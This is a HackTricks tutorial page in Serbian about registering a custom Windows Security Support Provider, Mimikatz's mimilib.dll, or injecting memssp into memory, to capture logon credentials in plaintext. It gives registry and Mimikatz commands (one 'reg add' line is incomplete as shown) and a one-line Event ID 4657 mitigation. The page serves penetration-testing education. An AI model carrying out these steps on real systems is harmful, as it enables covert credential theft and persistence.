# Custom SSP

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### Custom SSP

[Saznajte šta je SSP (Security Support Provider) ovde.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** da biste **uhvatili** u **čistom tekstu** kredencijale koji se koriste za pristup mašini.

#### Mimilib

Možete koristiti `mimilib.dll` binarni fajl koji pruža Mimikatz. **Ovo će zabeležiti sve kredencijale u čistom tekstu unutar fajla.**\
Ubacite dll fajl u `C:\Windows\System32\`\
Dobijte listu postojećih LSA Security Packages:

{% code title="napadac@cilj" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Dodajte `mimilib.dll` na listu podrške za sigurnosnog provajdera (Security Packages):

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

I nakon ponovnog pokretanja, sve akreditacije mogu se pronaći u čistom tekstu u `C:\Windows\System32\kiwissp.log`

#### U memoriji

Takođe možete ubaciti ovo direktno u memoriju koristeći Mimikatz (primetite da to može biti malo nestabilno/neće raditi):

```powershell
privilege::debug
misc::memssp
```

Ovo neće preživeti ponovno pokretanje.

#### Mitigacija

Dogadjaj ID 4657 - Provera kreiranja/izmene `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
